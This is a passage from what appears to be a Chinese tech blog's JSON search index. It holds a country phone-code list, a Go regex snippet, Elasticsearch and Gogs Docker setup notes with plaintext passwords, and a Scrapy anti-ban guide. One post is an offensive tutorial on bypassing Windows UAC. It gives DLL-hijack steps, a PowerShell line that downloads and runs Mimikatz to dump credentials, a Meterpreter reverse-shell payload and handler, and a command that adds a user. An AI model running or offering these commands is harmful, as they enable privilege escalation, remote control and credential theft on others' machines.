\"phoneCode\":\"298\"},{\"isoCode\":\"pf\",\"name\":\"法属玻里尼西亚\",\"phoneCode\":\"689\"},{\"isoCode\":\"gf\",\"name\":\"法属圭亚那\",\"phoneCode\":\"594\"},{\"isoCode\":\"tf\",\"name\":\"法属南半球领地\",\"phoneCode\":\"000\"},{\"isoCode\":\"ph\",\"name\":\"菲律宾\",\"phoneCode\":\"63\"},{\"isoCode\":\"fi\",\"name\":\"芬兰\",\"phoneCode\":\"358\"},{\"isoCode\":\"cv\",\"name\":\"佛得角\",\"phoneCode\":\"238\"},{\"isoCode\":\"fk\",\"name\":\"福克兰群岛 (马尔维纳斯)\",\"phoneCode\":\"500\"},{\"isoCode\":\"gm\",\"name\":\"冈比亚\",\"phoneCode\":\"220\"},{\"isoCode\":\"cg\",\"name\":\"刚果共和国\",\"phoneCode\":\"242\"},{\"isoCode\":\"cd\",\"name\":\"刚果民主共和国\",\"phoneCode\":\"243\"},{\"isoCode\":\"co\",\"name\":\"哥伦比亚\",\"phoneCode\":\"57\"},{\"isoCode\":\"cr\",\"name\":\"哥斯达黎加\",\"phoneCode\":\"506\"},{\"isoCode\":\"gg\",\"name\":\"格恩西岛\",\"phoneCode\":\"44\"},{\"isoCode\":\"gd\",\"name\":\"格林纳达\",\"phoneCode\":\"1473\"},{\"isoCode\":\"gl\",\"name\":\"格陵兰\",\"phoneCode\":\"299\"},{\"isoCode\":\"cu\",\"name\":\"古巴\",\"phoneCode\":\"53\"},{\"isoCode\":\"gp\",\"name\":\"瓜德罗普岛\",\"phoneCode\":\"590\"},{\"isoCode\":\"gu\",\"name\":\"关岛\",\"phoneCode\":\"1671\"},{\"isoCode\":\"gy\",\"name\":\"圭亚那\",\"phoneCode\":\"592\"},{\"isoCode\":\"kz\",\"name\":\"哈萨克斯坦\",\"phoneCode\":\"7\"},{\"isoCode\":\"ht\",\"name\":\"海地\",\"phoneCode\":\"509\"},{\"isoCode\":\"kr\",\"name\":\"韩国\",\"phoneCode\":\"82\"},{\"isoCode\":\"nl\",\"name\":\"荷兰\",\"phoneCode\":\"31\"},{\"isoCode\":\"an\",\"name\":\"荷属安的列斯\",\"phoneCode\":\"599\"},{\"isoCode\":\"hm\",\"name\":\"赫德岛及麦当劳群岛\",\"phoneCode\":\"000\"},{\"isoCode\":\"me\",\"name\":\"黑山共和国\",\"phoneCode\":\"382\"},{\"isoCode\":\"hn\",\"name\":\"洪都拉斯\",\"phoneCode\":\"504\"},{\"isoCode\":\"ki\",\"name\":\"基里巴斯\",\"phoneCode\":\"686\"},{\"isoCode\":\"dj\",\"name\":\"吉布提\",\"phoneCode\":\"253\"},{\"isoCode\":\"kg\",\"name\":\"吉尔吉斯斯坦\",\"phoneCode\":\"996\"},{\"isoCode\":\"gn\",\"name\":\"几内亚\",\"phoneCode\":\"224\"},{\"isoCode\":\"gw\",\"name\":\"几内亚比绍\",\"phoneCode\":\"245\"},{\"isoCode\":\"cb\",\"name\":\"加勒比海国家\",\"phoneCode\":\"000\"},{\"isoCode\":\"ca\",\"name\":\"加拿大\",\"phoneCode\":\"1\"},{\"isoCode\":\"gh\",\"name\":\"加纳\",\"phoneCode\":\"233\"},{\"isoCode\":\"ga\",\"name\":\"加蓬\",\"phoneCode\":\"241\"},{\"isoCode\":\"kh\",\"name\":\"柬埔寨\",\"phoneCode\":\"855\"},{\"isoCode\":\"cz\",\"name\":\"捷克共和国\",\"phoneCode\":\"420\"},{\"isoCode\":\"zw\",\"name\":\"津巴布韦\",\"phoneCode\":\"263\"},{\"isoCode\":\"cm\",\"name\":\"喀麦隆\",\"phoneCode\":\"237\"},{\"isoCode\":\"qa\",\"name\":\"卡塔尔\",\"phoneCode\":\"974\"},{\"isoCode\":\"ky\",\"name\":\"开曼群岛\",\"phoneCode\":\"1\"},{\"isoCode\":\"km\",\"name\":\"科摩罗\",\"phoneCode\":\"269\"},{\"isoCode\":\"ko\",\"name\":\"科索沃\",\"phoneCode\":\"000\"},{\"isoCode\":\"ci\",\"name\":\"科特迪瓦\",\"phoneCode\":\"225\"},{\"isoCode\":\"kw\",\"name\":\"科威特\",\"phoneCode\":\"965\"},{\"isoCode\":\"cc\",\"name\":\"可可群岛\",\"phoneCode\":\"61\"},{\"isoCode\":\"hr\",\"name\":\"克罗地亚\",\"phoneCode\":\"385\"},{\"isoCode\":\"ke\",\"name\":\"肯尼亚\",\"phoneCode\":\"254\"},{\"isoCode\":\"ck\",\"name\":\"库克群岛\",\"phoneCode\":\"682\"},{\"isoCode\":\"lv\",\"name\":\"拉脱维亚\",\"phoneCode\":\"371\"},{\"isoCode\":\"ls\",\"name\":\"莱索托\",\"phoneCode\":\"266\"},{\"isoCode\":\"la\",\"name\":\"老挝\",\"phoneCode\":\"856\"},{\"isoCode\":\"lb\",\"name\":\"黎巴嫩\",\"phoneCode\":\"961\"},{\"isoCode\":\"lr\",\"name\":\"利比里亚\",\"phoneCode\":\"231\"},{\"isoCode\":\"ly\",\"name\":\"利比亚\",\"phoneCode\":\"218\"},{\"isoCode\":\"lt\",\"name\":\"立陶宛\",\"phoneCode\":\"370\"},{\"isoCode\":\"li\",\"name\":\"列支敦士登\",\"phoneCode\":\"423\"},{\"isoCode\":\"re\",\"name\":\"留尼汪岛\",\"phoneCode\":\"262\"},{\"isoCode\":\"lu\",\"name\":\"卢森堡\",\"phoneCode\":\"352\"},{\"isoCode\":\"rw\",\"name\":\"卢旺达\",\"phoneCode\":\"250\"},{\"isoCode\":\"ro\",\"name\":\"罗马尼亚\",\"phoneCode\":\"40\"},{\"isoCode\":\"mg\",\"name\":\"马达加斯加\",\"phoneCode\":\"261\"},{\"isoCode\":\"mt\",\"name\":\"马耳他\",\"phoneCode\":\"356\"},{\"isoCode\":\"mv\",\"name\":\"马尔代夫\",\"phoneCode\":\"960\"},{\"isoCode\":\"mw\",\"name\":\"马拉维\",\"phoneCode\":\"265\"},{\"isoCode\":\"my\",\"name\":\"马来西亚\",\"phoneCode\":\"60\"},{\"isoCode\":\"ml\",\"name\":\"马里\",\"phoneCode\":\"223\"},{\"isoCode\":\"mk\",\"name\":\"马其顿\",\"phoneCode\":\"389\"},{\"isoCode\":\"mh\",\"name\":\"马歇尔群岛\",\"phoneCode\":\"692\"},{\"isoCode\":\"yt\",\"name\":\"马约特岛\",\"phoneCode\":\"269\"},{\"isoCode\":\"mu\",\"name\":\"毛里求斯\",\"phoneCode\":\"230\"},{\"isoCode\":\"mr\",\"name\":\"毛里塔尼亚\",\"phoneCode\":\"222\"},{\"isoCode\":\"us\",\"name\":\"美国\",\"phoneCode\":\"1\"},{\"isoCode\":\"as\",\"name\":\"美属萨摩亚\",\"phoneCode\":\"1684\"},{\"isoCode\":\"vi\",\"name\":\"美属维尔京群岛\",\"phoneCode\":\"1340\"},{\"isoCode\":\"mn\",\"name\":\"蒙古\",\"phoneCode\":\"976\"},{\"isoCode\":\"ms\",\"name\":\"蒙特色拉特岛\",\"phoneCode\":\"1664\"},{\"isoCode\":\"bd\",\"name\":\"孟加拉国\",\"phoneCode\":\"880\"},{\"isoCode\":\"pe\",\"name\":\"秘鲁\",\"phoneCode\":\"51\"},{\"isoCode\":\"fm\",\"name\":\"密克罗尼西亚联邦\",\"phoneCode\":\"691\"},{\"isoCode\":\"mm\",\"name\":\"缅甸\",\"phoneCode\":\"95\"},{\"isoCode\":\"md\",\"name\":\"摩尔多瓦\",\"phoneCode\":\"373\"},{\"isoCode\":\"ma\",\"name\":\"摩洛哥\",\"phoneCode\":\"212\"},{\"isoCode\":\"mc\",\"name\":\"摩纳哥\",\"phoneCode\":\"377\"},{\"isoCode\":\"mz\",\"name\":\"莫桑比克\",\"phoneCode\":\"258\"},{\"isoCode\":\"mx\",\"name\":\"墨西哥\",\"phoneCode\":\"52\"},{\"isoCode\":\"mq\",\"name\":\"那提尼克\",\"phoneCode\":\"596\"},{\"isoCode\":\"na\",\"name\":\"纳米比亚\",\"phoneCode\":\"264\"},{\"isoCode\":\"za\",\"name\":\"南非\",\"phoneCode\":\"27\"},{\"isoCode\":\"aq\",\"name\":\"南极洲\",\"phoneCode\":\"672\"},{\"isoCode\":\"gs\",\"name\":\"南乔治亚及南三明治群岛\",\"phoneCode\":\"000\"},{\"isoCode\":\"ss\",\"name\":\"南苏丹\",\"phoneCode\":\"000\"},{\"isoCode\":\"np\",\"name\":\"尼泊尔\",\"phoneCode\":\"977\"},{\"isoCode\":\"ni\",\"name\":\"尼加拉瓜\",\"phoneCode\":\"505\"},{\"isoCode\":\"ne\",\"name\":\"尼日尔\",\"phoneCode\":\"227\"},{\"isoCode\":\"ng\",\"name\":\"尼日利亚\",\"phoneCode\":\"234\"},{\"isoCode\":\"nu\",\"name\":\"纽埃岛\",\"phoneCode\":\"683\"},{\"isoCode\":\"no\",\"name\":\"挪威\",\"phoneCode\":\"47\"},{\"isoCode\":\"nf\",\"name\":\"诺福克岛\",\"phoneCode\":\"672\"},{\"isoCode\":\"pw\",\"name\":\"帕劳群岛\",\"phoneCode\":\"680\"},{\"isoCode\":\"pn\",\"name\":\"皮特克恩岛\",\"phoneCode\":\"870\"},{\"isoCode\":\"pt\",\"name\":\"葡萄牙\",\"phoneCode\":\"351\"},{\"isoCode\":\"tt\",\"name\":\"千里达及托巴哥\",\"phoneCode\":\"1868\"},{\"isoCode\":\"jp\",\"name\":\"日本\",\"phoneCode\":\"81\"},{\"isoCode\":\"se\",\"name\":\"瑞典\",\"phoneCode\":\"46\"},{\"isoCode\":\"ch\",\"name\":\"瑞士\",\"phoneCode\":\"41\"},{\"isoCode\":\"ws\",\"name\":\"萨摩亚\",\"phoneCode\":\"685\"},{\"isoCode\":\"rs\",\"name\":\"塞尔维亚\",\"phoneCode\":\"381\"},{\"isoCode\":\"cs\",\"name\":\"塞尔维亚蒙特内哥罗\",\"phoneCode\":\"000\"},{\"isoCode\":\"sl\",\"name\":\"塞拉利昂\",\"phoneCode\":\"232\"},{\"isoCode\":\"sn\",\"name\":\"塞内加尔\",\"phoneCode\":\"221\"},{\"isoCode\":\"cy\",\"name\":\"塞浦路斯\",\"phoneCode\":\"357\"},{\"isoCode\":\"sc\",\"name\":\"塞舌尔\",\"phoneCode\":\"248\"},{\"isoCode\":\"sa\",\"name\":\"沙特阿拉伯\",\"phoneCode\":\"966\"},{\"isoCode\":\"cx\",\"name\":\"圣诞岛\",\"phoneCode\":\"61\"},{\"isoCode\":\"st\",\"name\":\"圣多美及普林西比\",\"phoneCode\":\"239\"},{\"isoCode\":\"sh\",\"name\":\"圣赫勒拿\",\"phoneCode\":\"290\"},{\"isoCode\":\"kn\",\"name\":\"圣克里斯多福和尼维斯\",\"phoneCode\":\"1869\"},{\"isoCode\":\"lc\",\"name\":\"圣卢西亚岛\",\"phoneCode\":\"1\"},{\"isoCode\":\"sm\",\"name\":\"圣马力诺\",\"phoneCode\":\"378\"},{\"isoCode\":\"pm\",\"name\":\"圣皮瑞及麦克隆\",\"phoneCode\":\"508\"},{\"isoCode\":\"vc\",\"name\":\"圣文森及格瑞那丁\",\"phoneCode\":\"1\"},{\"isoCode\":\"lk\",\"name\":\"斯里兰卡\",\"phoneCode\":\"94\"},{\"isoCode\":\"sk\",\"name\":\"斯洛伐克共和国\",\"phoneCode\":\"421\"},{\"isoCode\":\"si\",\"name\":\"斯洛文尼亚\",\"phoneCode\":\"386\"},{\"isoCode\":\"sj\",\"name\":\"斯瓦尔巴群岛\",\"phoneCode\":\"000\"},{\"isoCode\":\"sz\",\"name\":\"斯威士兰\",\"phoneCode\":\"268\"},{\"isoCode\":\"sd\",\"name\":\"苏丹\",\"phoneCode\":\"249\"},{\"isoCode\":\"sr\",\"name\":\"苏里南\",\"phoneCode\":\"597\"},{\"isoCode\":\"so\",\"name\":\"索马里\",\"phoneCode\":\"252\"},{\"isoCode\":\"sb\",\"name\":\"所罗门群岛\",\"phoneCode\":\"677\"},{\"isoCode\":\"tj\",\"name\":\"塔吉克斯坦\",\"phoneCode\":\"992\"},{\"isoCode\":\"th\",\"name\":\"泰国\",\"phoneCode\":\"66\"},{\"isoCode\":\"tz\",\"name\":\"坦尚尼亚\",\"phoneCode\":\"255\"},{\"isoCode\":\"to\",\"name\":\"汤加\",\"phoneCode\":\"676\"},{\"isoCode\":\"tn\",\"name\":\"突尼斯\",\"phoneCode\":\"216\"},{\"isoCode\":\"tv\",\"name\":\"图瓦卢\",\"phoneCode\":\"688\"},{\"isoCode\":\"tr\",\"name\":\"土耳其\",\"phoneCode\":\"90\"},{\"isoCode\":\"tc\",\"name\":\"土克斯及开科斯群岛\",\"phoneCode\":\"1649\"},{\"isoCode\":\"tm\",\"name\":\"土库曼斯坦\",\"phoneCode\":\"993\"},{\"isoCode\":\"tk\",\"name\":\"托克劳\",\"phoneCode\":\"690\"},{\"isoCode\":\"wf\",\"name\":\"瓦利斯及福杜纳群岛\",\"phoneCode\":\"681\"},{\"isoCode\":\"vu\",\"name\":\"瓦努阿图\",\"phoneCode\":\"678\"},{\"isoCode\":\"gt\",\"name\":\"危地马拉\",\"phoneCode\":\"502\"},{\"isoCode\":\"ve\",\"name\":\"委内瑞拉\",\"phoneCode\":\"58\"},{\"isoCode\":\"bn\",\"name\":\"文莱达鲁萨兰国\",\"phoneCode\":\"673\"},{\"isoCode\":\"ug\",\"name\":\"乌干达\",\"phoneCode\":\"256\"},{\"isoCode\":\"ua\",\"name\":\"乌克兰\",\"phoneCode\":\"380\"},{\"isoCode\":\"uy\",\"name\":\"乌拉圭\",\"phoneCode\":\"598\"},{\"isoCode\":\"uz\",\"name\":\"乌兹别克斯坦\",\"phoneCode\":\"998\"},{\"isoCode\":\"es\",\"name\":\"西班牙\",\"phoneCode\":\"34\"},{\"isoCode\":\"eh\",\"name\":\"西弗里斯兰\",\"phoneCode\":\"000\"},{\"isoCode\":\"gr\",\"name\":\"希腊\",\"phoneCode\":\"30\"},{\"isoCode\":\"sg\",\"name\":\"新加坡\",\"phoneCode\":\"65\"},{\"isoCode\":\"nc\",\"name\":\"新喀里多尼亚\",\"phoneCode\":\"687\"},{\"isoCode\":\"nz\",\"name\":\"新西兰\",\"phoneCode\":\"64\"},{\"isoCode\":\"hu\",\"name\":\"匈牙利\",\"phoneCode\":\"36\"},{\"isoCode\":\"sy\",\"name\":\"叙利亚\",\"phoneCode\":\"963\"},{\"isoCode\":\"jm\",\"name\":\"牙买加\",\"phoneCode\":\"1\"},{\"isoCode\":\"am\",\"name\":\"亚美尼亚\",\"phoneCode\":\"374\"},{\"isoCode\":\"ye\",\"name\":\"也门\",\"phoneCode\":\"967\"},{\"isoCode\":\"iq\",\"name\":\"伊拉克\",\"phoneCode\":\"964\"},{\"isoCode\":\"ir\",\"name\":\"伊朗\",\"phoneCode\":\"98\"},{\"isoCode\":\"il\",\"name\":\"以色列\",\"phoneCode\":\"972\"},{\"isoCode\":\"it\",\"name\":\"意大利\",\"phoneCode\":\"39\"},{\"isoCode\":\"in\",\"name\":\"印度\",\"phoneCode\":\"91\"},{\"isoCode\":\"id\",\"name\":\"印度尼西亚\",\"phoneCode\":\"62\"},{\"isoCode\":\"gb\",\"name\":\"英国\",\"phoneCode\":\"44\"},{\"isoCode\":\"im\",\"name\":\"英属曼岛\",\"phoneCode\":\"44\"},{\"isoCode\":\"vg\",\"name\":\"英属维尔京群岛\",\"phoneCode\":\"1284\"},{\"isoCode\":\"io\",\"name\":\"英属印度洋领地\",\"phoneCode\":\"000\"},{\"isoCode\":\"jo\",\"name\":\"约旦\",\"phoneCode\":\"962\"},{\"isoCode\":\"vn\",\"name\":\"越南\",\"phoneCode\":\"84\"},{\"isoCode\":\"zm\",\"name\":\"赞比亚\",\"phoneCode\":\"260\"},{\"isoCode\":\"je\",\"name\":\"泽西岛\",\"phoneCode\":\"44\"},{\"isoCode\":\"td\",\"name\":\"乍得\",\"phoneCode\":\"235\"},{\"isoCode\":\"gi\",\"name\":\"直布罗陀\",\"phoneCode\":\"350\"},{\"isoCode\":\"cl\",\"name\":\"智利\",\"phoneCode\":\"56\"},{\"isoCode\":\"cf\",\"name\":\"中非共和国\",\"phoneCode\":\"236\"},{\"isoCode\":\"ge\",\"name\":\"佐治亚\",\"phoneCode\":\"995\"},{\"isoCode\":\"nr\",\"name\":\"瑙鲁\",\"phoneCode\":\"674\"},{\"isoCode\":\"va\",\"name\":\"梵蒂冈 (教廷)\",\"phoneCode\":\"39\"},{\"isoCode\":\"fj\",\"name\":\"斐济\",\"phoneCode\":\"679\"},{\"isoCode\":\"oo\",\"name\":\"其他\",\"phoneCode\":\"000\"}]","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang 正则","title":"Go语言 正则","text":"sudo apt-get install libonig-dev\n\nimport \"rubex\"\n\nrxp := rubex.MustCompile(\"[a-z]*\")\nif err != nil {\n    // whoops\n}\nresult := rxp.FindString(\"a me my\")\nif result != \"\" {\n    // FOUND A STRING!! YAY! Must be \"a\" in this instance\n} else {\n    // no good\n}\n`","tags":null},{"location":"//blog.pytool.com/Hacker/2015-10-01 使用Powershell Bypass UAC","title":"使用Powershell Bypass UAC","text":"0x00 简介\n\nUAC(User Account Control，用户帐户控制)是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。也就是说一旦用户允许启动的应用程序通过UAC验证，那么这个程序也就有了管理员权限。许多情况下，我们获取了反弹的shell但是由于UAC这个烦人的东西并不能获取最高的权限，今天主要介绍使用powershell来bypass uac从而获取更高的权限。\n\n0x01 Bypass UAC\nUACME及使用方法\n\n我们选择的用以绕过UAC的工具是UACME。这个优秀的工具实现了各种方法，并且值得庆幸的是它是开源的，为此感谢@hFirF0XAs。因为我总是尽量在后期利用阶段都使用PowerShell，所以我测试了UACME，并使用PowerShell实现了其中的一些方法。这里我给出Invoke-PsUACme.ps1文件，你可以在Nishang中的“Escalation提权”分类中找到它。\n\n首先，我们以sysprep方法开始，它是绕过UAC最常用的方法，它在2009年由Leo Davidson而出名详情。它包括以下步骤：\nstep1: 复制DLL文件到C:\\Windows\\System32\\sysprep目录，DLL的名字取决于操作系统版本（1）Windows 7上为CRYPTBASE.dll。\n（2）Windows 8上为shcore.dll。\nstep2：从上面的目录执行Sysprep.exe。他将加载上面的DLL，完成权限的提升。\n具体dll名及利用exe如下表：\n\n总结了一下突破Windows UAC的方式主要有以下几种：\n\n1、使用IFileOperation COM接口；\n2、使用Wusa.exe的extract选项；\n3、远程注入SHELLCODE 到傀儡进程;\n4、DLL劫持，劫持系统的DLL文件；\n5、直接提权过UAC;\n6、MS15-076(感觉上也可以用到) POC。\n部分方式需要我们将DLL文件拷贝到相应的目录，这里拿Sysprep来做测试，要往这个目录拷贝文件需要管理员的权限，直接copy是不可以的,本文介绍的脚本使用了第二种方式，下面是一个测试。\n使用copy:\n\nC:\\UAC  copy evil.dll C:\\Windows\\System32\\sysprep\\\n\n使用Wusa.exe：\n\nC:\\  makecab C:\\uac\\evil.dll C:\\uac\\uac.cab\nC:\\  wusa C:\\uac\\uac.cab /extract:C:\\Windows\\System32\\sysprep\\\n\n可以看到使用wusa成功拷贝。\n\n 0x02 Invoke-PsUACme\n\nInvoke-PsUACme 是nishang的一个脚本，该脚本使用了列表中的几个方式来进行bypass UAC，目前支持Win7 ，Win8,由于Win10的wusa extract选项不在受支持，所以此脚本并不适用于Win10。\n该脚本的所使用的DLL来自于开源项目UACME。nishang作者对代码进行了一下简单地修改，这里就不详细说了。\n这里介绍一下脚本的使用,加载脚本：\n\nPS C:\\UAC  . .\\Invoke-PsUACme.ps1\n查看说明：\n\nPS C:\\UAC  help Invoke-PsUACme\n主要参数说明：Payload为自定义要执行的程序；method为bypass的方式，包括Sysprep，OOBE，ActionQueue等几种；Verbose显示程序运行过程；CustomDLL64,CustomDLL32可以指定自定义DLL。\n\n执行：\n\nPS C:\\UAC  Invoke-PsUACme -Verbose\n\n使用Sysprep执行payload:\n\nPS C:\\UAC  Invoke-PsUACme -method sysprep -Payload \"cmd.exe\"\n\n执行某个自定义程序需要在payload出填写绝对路径。\n\n自定义DLL：\n\nPS C:\\  Invoke-PSUACMe -CustomDll64 C:\\test\\test64.dll -CustomDll32 C:\\test\\test32.dll -Verbose\"\n\n0x03 能做什么\n\n1）通过bypass UAC我们可以通过普通的cmd抓到管理员密码。\n普通cmd运行在线抓明文：\n\npowershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz\n\nbypass UAC以后：\n\nPS C:\\UAC  . .\\Invoke-PsUACme.ps1\nPS C:\\UAC  Invoke-PsUACme -Payload \"powershell -noexit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz\"\n\n让meterpreter获得更高的权限。\n生成payload:\n☁  ~  sudo msfvenom -p windows/meterpreter/reversetcp LHOST=x.x.x.x LPORT=8889 -f psh-reflection\n将输出文件保存为psh.ps1\n\nmsf开启监听：\n\nmsf   use exploit/multi/handler\nmsf exploit(handler)   set payload windows/meterpreter/reversetcp\npayload =  windows/meterpreter/reversetcp\nmsf exploit(handler)   set lhost x.x.x.x\nlhost =  x.x.x.x\nmsf exploit(handler)   set lport 8889\nlport =  8889\nmsf exploit(handler)   exploit\n普通cmd执行:\n\nbypass UAC 以后执行：\n\n 0x04 Win10 Bypass UAC\n\n我修改了一个使用远程注入方式Bypass UAC的powersell脚本以支持Win10,脚本地址：戳我\n\n使用方式与nishang不同，并没有回显，使用win10进行测试：\n\nPS F:\\drops\\UAC  . .\\invoke-BypassUAC.ps1\nPS F:\\drops\\UAC  invoke-BypassUAC -Command 'net user 1 \"Password123!\" /add'\n\n除了上面的脚本，UACME也很好的支持win10,使用方式为：\n\nakagi32.exe 1\nakagi64.exe 3\nakagi32 1 c:\\windows\\system32\\calc.exe\nakagi64 3 c:\\windows\\system32\\cmd.exe\n0x05 小结\n\n绕过UAC能获取更高的权限，你还发愁抓密码么？\n\nhttp://evi1cg.me/archives/PowershellBypass_UAC.html\nhttp://www.freebuf.com/articles/system/81286.html","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 Beats使用ingest","title":"Beats配置详解","text":"https://kibana.logstash.es/content/elasticsearch/ingest.html\nhttps://www.elastic.co/guide/en/elasticsearch/reference/5.4/accessing-data-in-pipelines.html\n\n1. Elasticsearch开启Ingest功能\nIngest 节点是 Elasticsearch 5.0 新增的节点类型和功能。其开启方式为：在 elasticsearch.yml 中定义：\n\nnode.ingest: true\n\ncurl -u elastic:changeme 120.92.36.21:9200/ingest\ncurl -u elastic:changeme 120.92.36.21:9200/cluster/settings\n\n数据转换(Ingest Node)\n\n在5.0.0中，新增了一个特性数据转换(Ingest Nodes)。他可以不依赖于Logstash实现常用的过滤能力，比如grok, split, convert, date等。它可以用来执行常见的数据转换和处理。可以使用转换节点在实际索引之前对文档进行预处理。在任何转换节点中，处理索引或者块处理之前进行预处理转换。可以在任何节点开启转换功能，或者建立单独的转换节点。在默认情况下，在任何节点都有开启了转换能力，如果要关闭转换能力，需要在配置文件中添加：\n\nnode.ingest: false\n\n在索引文档之前进行预处理，它定义了一个指定一系列处理器的管道。每个处理器以某种方式转换文档。例如，你可能有一个管道，包括一个处理器，从文档中删除字段，然后进入另一个处理器，对文档中的字段进行重命名。\n使用一个管道，你只需在一个索引或批量请求后加入管道参数。例如:\n\nPUT my-index/my-type/my-id?pipeline=mypipelineid\n{\n  \"foo\": \"bar\"\n}\n\n在使用前，需要先定义管道，例如定义上面的管道：\nPUT ingest/pipeline/my-pipeline-id\n{\n  \"description\" : \"describe pipeline\",\n  \"processors\" : [\n    {\n      \"set\" : {\n        \"field\": \"foo\",\n        \"value\": \"bar\"\n      }\n\n      \"set\": {\n        \"field\": \"index\"\n        \"value\": \"{{geoip.countryisocode}}\"\n      }\n    }\n  ]\n}\n{{ 引用mapping 变量}}\n`","tags":null},{"location":"//blog.pytool.com/Post/敏捷开发/2016-10-04 Gogs","title":"docker安装gogs","text":"docker安装gogs\n\n参考官方说明\ngogs mysql 支持\n运行一个mysql image\n\n1. 修改 ssh端口\nvim /etc/ssh/sshdconfig\n    port 222\nservice sshd restart\n\n 开启 gogs 服务\ndocker run -d --restart=always --name=mysql-gogs -v $HOME/docker/gogs/mysql:/var/lib/mysql -e MYSQLROOTPASSWORD=kyxxB401 -e MYSQLDATABASE=gogs -e MYSQLUSER=gogs -e MYSQLPASSWORD=kyxxB401 mysql\n\ndocker run -d --restart=always --name=mysql-gogs -v ~/docker/gogs/mysql:/var/lib/mysql mysql\n\ndocker run -d --restart=always --name=mysql-gogs -v ~/docker/gogs/mysql:/var/lib/mysql -e MYSQLROOTPASSWORD=kyxx401 -e MYSQLDATABASE=gogs mysql\ndocker run -d --restart=always --name=gogs -p 22:22 -p 3000:3000 -v ~/docker/gogs/data:/data --link mysql-gogs:mysql gogs/gogs\ndocker run -it --rm --link mysql-gogs:mysql mysql:latest mysql -hmysql -uroot -pkyxx401\n\n3. 配置nginx 代理\n\n必填配置:\n数据库主机: mysql:3306\n应用名称:  Git Service\n域名:  pytool.com        git@pytool.com:/xxx\nHTTP 端口号: 3000        # 容器内端口号\n应用 URL : http://pytool.com/\n\n创建管理员帐号并不是必须的，因为 ID=1 的用户将自动获得管理员权限\n\n{gogs docker 启动挂在路径}/gogs/conf/app.ini\n配置项\n\ndocker gogs的ssh的端口号22映射到docker主机的10022端口，所以ssh git@dockerhost会提示输入密码\n\n解决方法：在当前用户目录的.ssh目录下，建立config文件，\n\nHost gogs.dev\nHostName gogs.dev\nPort 10022\nUser git\n\n说明:Host:指定gogs的host（不要和docker host的名字一样，要不ssh dockerhost又有问题了）;Host Name:好像没啥用;Port:为gogs的ssh映射后的端口;User:gogs运行用户\n\n然后再ssh git@gogs.dev就会出现git shell的提示，这样就可以用ssh的方式克隆gogs上的git仓库了","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2016-10-06 Scrapy研究探索（七）如何防止被ban之策略大集合","title":"Scrapy研究探索（七）如何防止被ban之策略大集合","text":"话说在尝试设置downloaddelay小于1，并且无任何其他防止被ban的策略之后，我终于成功的被ban了。\n\n关于scrapy的使用可参见之前文章：\n\nhttp://blog.csdn.net/u012150179/article/details/34913315\n\nhttp://blog.csdn.net/u012150179/article/details/34486677\n\nhttp://blog.csdn.net/u012150179/article/details/34441655\n\nhttp://blog.csdn.net/u012150179/article/details/32911511\n敌退我进，敌攻我挡。\n\n本篇博客主要研究使用防止被ban的几大策略以及在scrapy中的使用。\n\n1.策略一：设置downloaddelay\n\n这个在之前的教程中已经使用过（http://blog.csdn.net/u012150179/article/details/34913315），他的作用主要是设置下载的等待时间，大规模集中的访问对服务器的影响最大，相当与短时间中增大服务器负载。\n\n下载等待时间长，不能满足段时间大规模抓取的要求，太短则大大增加了被ban的几率。\n使用注意：\n\ndownloaddelay可以设置在settings.py中，也可以在spider中设置，在之前博客中（http://blog.csdn.net/u012150179/article/details/34913315）已经使用过，这里不再过多阐述。\n\n2.策略二：禁止cookies\n\n所谓cookies，是指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密），禁止cookies也就防止了可能使用cookies识别爬虫轨迹的网站得逞。\n\n使用：\n\n在settings.py中设置COOKIESENABLES=False。也就是不启用cookies middleware，不想web server发送cookies。\n\n3.策略三：使用user agent池\n\n所谓的user agent，是指包含浏览器信息、操作系统信息等的一个字符串，也称之为一种特殊的网络协议。服务器通过它判断当前访问对象是浏览器、邮件客户端还是网络爬虫。在request.headers可以查看user agent。如下，使用scrapy shell查看：\n\n[python] view plain copy\n在CODE上查看代码片派生到我的代码片\n\n    scrapy shell http://blog.csdn.net/u012150179/article/details/34486677  \n\n进而输入如下，可得到uesr agent信息：\n\n由此得到,scrapy本身是使用Scrapy/0.22.2来表明自己身份的。这也就暴露了自己是爬虫的信息。\n\n使用：\n\n首先编写自己的UserAgentMiddle中间件，新建rotateuseragent.py,代码如下：\n\n[python] view plain copy\n在CODE上查看代码片派生到我的代码片\n\n    # --coding:utf-8--  \n\n    from scrapy import log  \n\n    \"\"\"避免被ban策略之一：使用useragent池。\n\n    使用注意：需在settings.py中进行相应的设置。\n    \"\"\"  \n\n    import random  \n    from scrapy.contrib.downloadermiddleware.useragent import UserAgentMiddleware  \n\n    class RotateUserAgentMiddleware(UserAgentMiddleware):  \n\n        def init(self, useragent=''):  \n            self.useragent = useragent  \n\n        def processrequest(self, request, spider):  \n            ua = random.choice(self.useragentlist)  \n            if ua:  \n                #显示当前使用的useragent  \n                print \"*****Current UserAgent:%s*********\" %ua  \n\n                #记录  \n                log.msg('Current UserAgent: '+ua, level='INFO')  \n                request.headers.setdefault('User-Agent', ua)  \n\n        #the default useragentlist composes chrome,I E,firefox,Mozilla,opera,netscape  \n        #for more user agent strings,you can find it in http://www.useragentstring.com/pages/useragentstring.php  \n        useragentlist = [\\  \n            \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 \"  \n            \"(KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\",  \n            \"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 \"  \n            \"(KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\",  \n            \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 \"  \n            \"(KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6\",  \n            \"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 \"  \n            \"(KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6\",  \n            